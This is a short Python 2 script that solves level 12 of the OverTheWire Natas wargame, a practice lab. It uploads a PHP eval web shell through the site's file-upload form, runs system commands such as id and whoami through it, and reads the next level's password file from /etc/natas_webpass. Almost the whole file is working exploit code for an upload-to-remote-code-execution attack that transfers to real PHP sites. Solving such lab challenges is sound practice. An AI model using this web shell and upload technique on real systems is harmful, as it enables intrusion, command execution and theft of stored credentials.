#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def exploit(level12pass):
    print "{+} Natas Level 12. Doing magic..."
    try:
        files = {"uploadedfile": "<?php eval($_REQUEST[1]);"}
        data = {"filename": "hax.php"}
        r = requests.post(url="http://natas12.natas.labs.overthewire.org/", auth=HTTPBasicAuth('natas12', level12pass), files=files, data=data)
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    shell_path = re.findall("The file <a href=\"(.*?)\"", r.text)
    shell_path = shell_path[0]
    try:
         data = {"1": "system('id;uname -a;whoami;pwd');"}
         r = requests.post(url="http://natas12.natas.labs.overthewire.org/%s" %(shell_path), auth=HTTPBasicAuth('natas12', level12pass), data=data)
    except Exception,e:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        print e
        return None
    print r.text
    try:
         data = {"1": "system('cat /etc/natas_webpass/natas13');"}
         r = requests.post(url="http://natas12.natas.labs.overthewire.org/%s" %(shell_path), auth=HTTPBasicAuth('natas12', level12pass), data=data)
    except Exception,e:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        print e
        return None
    return r.text.strip()
    #return None

def main(args):
    if len(args) != 2:
        sys.exit("use: %s level12password" %(args[0]))
    level13pass = exploit(args[1])
    if level13pass != None:
        print "{$$} Level 13 Password is: %s" %(level13pass)

if __name__ == "__main__":
    main(args=sys.argv)
